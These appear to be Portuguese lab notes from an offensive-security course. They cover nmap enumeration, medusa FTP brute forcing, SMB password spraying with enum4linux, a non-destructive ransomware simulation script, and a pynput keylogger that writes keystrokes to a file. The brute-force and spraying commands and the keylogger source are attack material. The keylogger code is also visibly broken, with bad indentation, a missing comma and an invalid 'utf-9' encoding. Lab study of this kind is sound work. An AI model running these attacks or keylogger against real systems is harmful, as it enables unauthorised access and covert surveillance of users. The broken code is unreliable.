Listar IP do equipamentos

Executar o comando **Ip a**   - lista o ip do equipamentos 192.168.56.101

Realizar o **ping  192.168.56.101**



Iniciar a Enumeração

No terminal executar **nmap -sV -p 21,22,80,445,139 192.168.56.101**



Testar o acesso ao ftp para saber se o serviço esta ativo



Criando arquivo com usuários para invasão  -  **echo -p 'user\\nmsfadmin\\nadmin\\nroot' > users.txt**



Criando arquivo com senhas para invasao



Ataque ao host -  **medusa -h  ip do host  -U users.txt -P pass.txt -M ftp -t 6**



Validar o acesso de ftp



Criando wordlist para ataque aos sites

**echo -p 'user\\nmsfadmin\\nadmin\\nroot' > users.txt repetir o cenário para uma de senhas**



ATAQUE EM CADEIA + PASSWORDSPRAY + ENUMERACAO



ATAQUE A UM SERVIÇO DE SMB = Descobrir usuario e testar acesso por sprayng (teste de 1 senha com varios usuario) ataque silecioso



Comando de enumeracao = **enum4linux -A iphost | tee enum4\_output.txt**





Criar worlist de usuarios



Ataque servidor smb





=========================================================================================================================================





\#!/usr/bin/env python3

\# simulador\_ransoware\_safe.py

\# Corrigido: sintaxe/indentação. VERSÃO NÃO-DESTRUTIVA (apenas simula ações).



import os

from pathlib import Path



\# 1. "Gerar" chave simulada (não usada para criptografia real)

def gerar\_chave():

    chave = "SIMULATED\_KEY\_0001"

    Path("chave\_simulada.key").write\_text(chave, encoding="utf-8")

    return chave



\# 2. Carregar chave simulada

def carregar\_chave():

    p = Path("chave\_simulada.key")

    return p.read\_text(encoding="utf-8") if p.exists() else None



\# 3. "Criptografar" um único arquivo — SIMULAÇÃO: cria um arquivo marcador .simulado

def simular\_criptografar\_arquivo(caminho\_arquivo):

    p = Path(caminho\_arquivo)

    if not p.is\_file():

        return False

    marcador = p.with\_suffix(p.suffix + ".simulado")

    # NÃO alteramos o arquivo original; apenas criamos marcador

    marcador.write\_text(f"SIMULATED: would encrypt {p.name}\\n", encoding="utf-8")

    return True



\# 4. Encontrar arquivos para "criptografar"

def encontrar\_arquivos(diretorio):

    lista = \[]

    for raiz, \_, arquivos in os.walk(diretorio):

        for nome in arquivos:

            # evita tocar no próprio simulador e em chaves/marcadores

            if nome in ("simulador\_ransoware\_safe.py", "chave\_simulada.key") or nome.endswith(".simulado"):

                continue

            caminho = os.path.join(raiz, nome)

            lista.append(caminho)

    return lista



\# 5. Mensagem de resgate (simulada — apenas cria arquivo de texto informativo)

def criar\_mensagem\_resgate():

    Path("MENSAGEM\_DE\_RESGATE\_SIMULADA.txt").write\_text(

        "SIMULAÇÃO: seus arquivos teriam sido criptografados (conteúdo fictício).\\n", encoding="utf-8"

    )



\# 6. Main — orquestra a simulação

def main():

    print("=== SIMULADOR NÃO-DESTRUTIVO ===")

    print("ATENÇÃO: este script NÃO modifica arquivos originais, apenas SIMULA a ação.")

    confirmar = input("Deseja executar a simulação em 'test\_files'? (sim/nao): ").strip().lower()

    if confirmar not in ("sim", "s", "yes", "y"):

        print("Simulação abortada.")

        return



    gerar\_chave()

    chave = carregar\_chave()

    print(f"Chave simulada criada/carregada: {chave}")



    diretorio = "test\_files"

    if not os.path.isdir(diretorio):

        print(f"Diretório '{diretorio}' não encontrado. Crie-o e adicione arquivos de teste.")

        return



    arquivos = encontrar\_arquivos(diretorio)

    print(f"Encontrados {len(arquivos)} arquivo(s) para simulação.")

    for arquivo in arquivos:

        ok = simular\_criptografar\_arquivo(arquivo)

        print(f"\[{'SIMULADO' if ok else 'IGNORADO'}] {arquivo}")



    criar\_mensagem\_resgate()

    print("Simulação concluída. Verifique arquivos '\*.simulado' e 'MENSAGEM\_DE\_RESGATE\_SIMULADA.txt'.")



if \_\_name\_\_ == "\_\_main\_\_":

    main()





===========================================================================================================





from pynput import keyboard



IGNORAR = {

&nbsp;   keyboard.Key.shift,

&nbsp;   keyboard.Key.shift\_r,   

&nbsp;   keyboard.Key.ctrl\_l,

&nbsp;   keyboard.Key.ctrl\_r,

&nbsp;   keyboard.Key.alt\_l,

&nbsp;   keyboard.Key.alt\_r,

&nbsp;   keyboard.Key.caps\_lock,

&nbsp;   keyboard.Key.cmd



}

def on\_press(key):

&nbsp; try:

&nbsp;   #se for uma tecla "normal" (letra, numero, simbolo)

&nbsp; with open("log.txt", "a" encoding="utf-8") as f:

&nbsp;   f.write(key.char)



&nbsp;   except.AttributeError:

with open("log.txt", "a", encoding="utf-9") as f:

&nbsp; if key == keyboard.Key.space:

&nbsp;   f.write(" ")

&nbsp; elif key == keyboard.Key.enter:   

&nbsp;   f.write("\\n")

&nbsp; elif key == keyboard.Key.tab: 

&nbsp;   f.write("\\t")

&nbsp; elif key == keyboard.Key.backspace:

&nbsp;   f.write(" ")

&nbsp;   elif key == keyboard.Key.esc:

&nbsp;     f.write("\[ESC] ") 

&nbsp;   elif key in IGNORAR:

&nbsp;     pass

&nbsp; else:

&nbsp;   f.write(f"\[{key.name}] ")



&nbsp;   with keyboard.Listener(on\_press=on\_press) as listener:

&nbsp;     

&nbsp;       listener.join()

